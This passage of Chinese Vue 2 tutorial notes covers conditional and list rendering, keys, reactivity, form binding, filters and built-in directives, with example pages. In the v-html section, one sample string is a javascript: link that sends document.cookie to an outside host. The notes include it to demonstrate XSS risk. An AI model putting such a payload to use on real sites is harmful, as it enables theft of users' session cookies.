					atguigu1:false,
					atguigu2:false,
				},
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```

# 11. 条件渲染

条件渲染：

1. v-if
	 	写法：
	 		(1).v-if="表达式" 
	 		(2).v-else-if="表达式"
	 		(3).v-else="表达式"
	适用于：切换频率较低的场景。
	特点：不展示的DOM元素直接被移除。
	注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
2. v-show
	 	写法：v-show="表达式"
	适用于：切换频率较高的场景。
	特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
	
3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

4. template的使用：

   如果需要满足条件的同时展现多个标签，又不希望有div来破坏现在的结构层次，可以使用template，渲染的时候不会出现template。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			
			<!-- 使用v-show做条件渲染 -->
			<h2 v-show="false">欢迎来到{{name}}</h2>
			<h2 v-show="1 === 1">欢迎来到{{name}}</h2>

			<!-- 使用v-if做条件渲染 -->
			<h2 v-if="false">欢迎来到{{name}}</h2>
			<h2 v-if="1 === 1">欢迎来到{{name}}</h2>

			<!-- v-else和v-else-if -->
			<div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div>

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

# 12. 列表渲染

## 12.1 基本列表

主要是v-for指令的使用：

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<!-- key不能重复，是每个对象的唯一标识 -->
				<li v-for="(p,index) of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{index}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,key) of car" :key="key">
					{{key}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
</html>
```

## 12.2 key的原理

1. 虚拟DOM中key的作用：
				key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新
	的虚拟DOM】, 
				随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则：

   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
      						①.若虚拟DOM中内容没变, 直接使用之前的真实DOM。
               						②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后【替换】掉页面中之前的真实DOM。

   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到到页面。

3. 用index作为key可能会引发的问题：
				
	1. 若对数据进行：逆序添加、逆序删除 等破坏顺序操作:
	
	   会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
	
	2. 如果结构中还包含输入类的DOM：
	
	   会产生错误DOM更新 ==> 界面有问题。
	
4. 开发中如何选择key?:
				
				1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号
	   等唯一值。
				2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表
				   用于展示，使用index作为key是没有问题的。

图解如下：

![遍历列表时key的作用](https://gitee.com/li-il/pic_bed/raw/master/img/20220319161356.png)

![遍历列表时key的作用](https://gitee.com/li-il/pic_bed/raw/master/img/20220319161428.png)

> 如果不写key的话会自动把index作为key。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
				<!-- <li v-for="(p,index) of persons" :key="p.id"> -->
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
						// this.persons.shift(p) 如果此处是shift的话，往后添加不会造成混乱
					}
				},
			})
		</script>
</html>
```

## 12.3 列表过滤

有两种实现方式，实现姓名过滤：

使用watch：

```vue
new Vue({
	el:'#root',
	data:{
		keyWord:'',
		persons:[
			{id:'001',name:'马冬梅',age:19,sex:'女'},
			{id:'002',name:'周冬雨',age:20,sex:'女'},
			{id:'003',name:'周杰伦',age:21,sex:'男'},
			{id:'004',name:'温兆伦',age:22,sex:'男'}
		],
		filPerons:[]
	},
	watch:{
		keyWord:{
			immediate:true,
			handler(val){
				this.filPerons = this.persons.filter((p)=>{
					return p.name.indexOf(val) !== -1
				})
			}
		}
	}
})
```

使用computed：

```vue
new Vue({
	el:'#root',
	data:{
		keyWord:'',
		persons:[
			{id:'001',name:'马冬梅',age:19,sex:'女'},
			{id:'002',name:'周冬雨',age:20,sex:'女'},
			{id:'003',name:'周杰伦',age:21,sex:'男'},
			{id:'004',name:'温兆伦',age:22,sex:'男'}
		]
	},
	computed:{
		filPerons(){
			return this.persons.filter((p)=>{
				return p.name.indexOf(this.keyWord) !== -1
			})
		}
	}
}) 
```

完整代码：

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```

## 12.4 列表过滤

需求增加：对所有的名字进行排序，如果已经在进行筛选，需要将筛选过后的人进行排序。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```

> 每次选择升序或者降序的时候就会修改sortType，就会修改data的值，然后就会重新渲染界面、

## 12.5 更新时的一个问题

在试图把马冬梅的信息修改成马老师的时候遇到问题：

可以观察到第一种方式是奏效的，但是第二种通过对象修改的方式是不奏效的，vue并没有检测到数据变化。

而且在第二种方式下，先点击按钮再打开vue开发者工具，会修改信息；但是调整顺序之后就不会了。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>更新时的一个问题</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<button @click="updateMei">更新马冬梅的信息</button>
			<ul>
				<li v-for="(p,index) of persons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			const vm = new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				methods: {
					updateMei(){
						// this.persons[0].name = '马老师' //奏效
						// this.persons[0].age = 50 //奏效
						// this.persons[0].sex = '男' //奏效

						// this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效 vue没有检测到数据变化
						this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
					}
				}
			}) 

		</script>
</html>
```

## 12.6 Vue监测数据改变的原理

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35}
					]
				}
			}
		})
	</script>
</html>
```

## 12.7 模拟一个数据监测

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
	</head>
	<body>
		<script type="text/javascript" >

			let data = {
				name:'尚硅谷',
				address:'北京',
			}

			//创建一个监视的实例对象，用于监视data中属性的变化
			const obs = new Observer(data)		
			console.log(obs)	

			//准备一个vm实例对象
			let vm = {}
			vm._data = data = obs

			function Observer(obj){
				//汇总对象中所有的属性形成一个数组
				const keys = Object.keys(obj)
				//遍历
				keys.forEach((k)=>{
					Object.defineProperty(this,k,{
						get(){
							return obj[k]
						},
						set(val){
							console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
							obj[k] = val
						}
					})
				})
			}
		</script>
	</body>
</html>
```

## 12.8 Vue.set的使用

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```

## 12.9 vue检测数据改变的原理-数组

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue监测数据改变的原理_数组</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校信息</h1>
			<h2>学校名称：{{school.name}}</h2>
			<h2>学校地址：{{school.address}}</h2>
			<h2>校长是：{{school.leader}}</h2>
			<hr/>
			<h1>学生信息</h1>
			<button @click="addSex">添加一个性别属性，默认值是男</button>
			<h2>姓名：{{student.name}}</h2>
			<h2 v-if="student.sex">性别：{{student.sex}}</h2>
			<h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>爱好</h2>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				school:{
					name:'尚硅谷',
					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
	</script>
</html>
```

## 12.10 总结vue数据监测

Vue监视数据的原理：

1. vue会监视data中所有层次的数据。
2. 如何监测对象中的数据？
				通过setter实现监视，且要在new Vue时就传入要监测的数据。
					(1).对象中后追加的属性，Vue默认不做响应式处理
					(2).如需给后添加的属性做响应式，请使用如下API：
									Vue.set(target，propertyName/index，value) 或 
									vm.$set(target，propertyName/index，value)
3. 如何监测数组中的数据？
					通过包裹数组更新元素的方法实现，本质就是做了两件事：
						(1).调用原生对应的方法对数组进行更新。
						(2).重新解析模板，进而更新页面。
3. 在Vue修改数组中的某个元素一定要用如下方法：
				1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
	2.Vue.set() 或 vm.$set()	

特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

# 13. 收集表单数据

收集表单数据：

若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
若：`<input type="checkbox"/>`

1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
2. 配置input的value属性:
   (1) v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
   (2) v-model的初始值是数组，那么收集的的就是value组成的数组

备注：v-model的三个修饰符：
				lazy：失去焦点再收集数据
				number：输入字符串转为有效的数字
				trim：输入首尾空格过滤

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 阻止默认事件的提交 -->
			<form @submit.prevent="demo">
				<!-- 表单收集 -->
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
	</script>
</html>
```

# 14. 过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
语法：

1. 注册过滤器：`Vue.filter(name,callback)` 或 `new Vue{filters:{}}`
2. 使用过滤器：`{{ xxx | 过滤器名}}`  或  `v-bind:属性 = "xxx | 过滤器名"`

备注：

1. 过滤器也可以接收额外参数，多个过滤器也可以串联
2. 并没有改变原本的数据，是产生新的对应的数据

基础过滤器实现

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD')}}</h3>
		</div>

	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})
	</script>
</html>
```

全局过滤器实现  及  默认传参的演示

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<div id="root">
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		// 全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```

# 15. 内置指令

## 15.1 v-text指令

v-bind	   : 单向绑定解析表达式, 可简写为 :xxx
v-model	 : 双向数据绑定
v-for  	   : 遍历数组/对象/字符串
v-on   	   : 绑定事件监听, 可简写为@
v-if 	 	  : 条件渲染（动态控制节点是否存存在）
v-else 	   : 条件渲染（动态控制节点是否存存在）
v-show 	 :  条件渲染 (动态控制节点是否展示)

v-text指令：

1. 作用：向其所在的节点中渲染文本内容。
2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>

		<div id="root">
			<div>你好，{{name}}</div>
			<div>你好，{{str}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```

> 效果图：
>
> ![image-20220321114355360](https://gitee.com/li-il/pic_bed/raw/master/img/20220321114402.png)

## 15.2 v-html指令

1. 作用：向指定节点中渲染包含html结构的内容。
2. 与插值语法的区别：
	 	(1). v-html会替换掉节点中所有的内容，{{xx}}则不会。
	 (2). v-html可以识别html结构。
3. 严重注意：v-html有安全性问题！！！！
		(1). 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
	(2). 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<div>你好，{{name}}</div>
			<div>你好，{{str}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

> 效果图：
>
> ![image-20220321114604934](https://gitee.com/li-il/pic_bed/raw/master/img/20220321114604.png)

## 15.3 v-cloak指令

v-cloak 指令（没有值）：

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			/* 通过style样式来控制是否显示文字 */
			[v-cloak]{
				display:none;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

> 打开浏览器之后不会显示任何效果，是因为第九行这里设置了display为none，不显示。
>
> 如果设置在五秒之后载入vue资源，则一开始页面上会显示{{name}}，但是我们不希望用户看到这样的代码，所以通过此指令搭配display来控制用户的视野。

## 15.4 v-once指令

v-once 指令：

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

## 15.5 v-pre指令

v-pre 指令：

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

# 16. 自定义指令

自定义指令总结：
一、定义语法：
    (1).局部指令：

```vue
new Vue({											
	directives:{指令名:配置对象}
}) 														
```

```vue
new Vue({
	directives{指令名:回调函数}
})
```

​    (2).全局指令：

```vue
Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
```

二、配置对象中常用的3个回调：
    (1).bind：指令与元素成功绑定时调用。
    (2).inserted：指令所在元素被插入页面时调用。
    (3).update：指令所在模板结构被重新解析时调用。
三、备注：
    (1).指令定义时不加v-，但使用时要加v-；
    (2).指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

-----

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

> 需求一：函数式
>
> 函数式指令不靠返回值，靠的是接收到的参数
>
> 接收到的参数：第一个是使用此指令的dom元素，第二个是此指令绑定的绑定对象
>
> big函数何时会被调用？
>
> 1. 指令与元素成功绑定时（一上来）。
>
> 2. 指令所在的模板被重新解析时。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
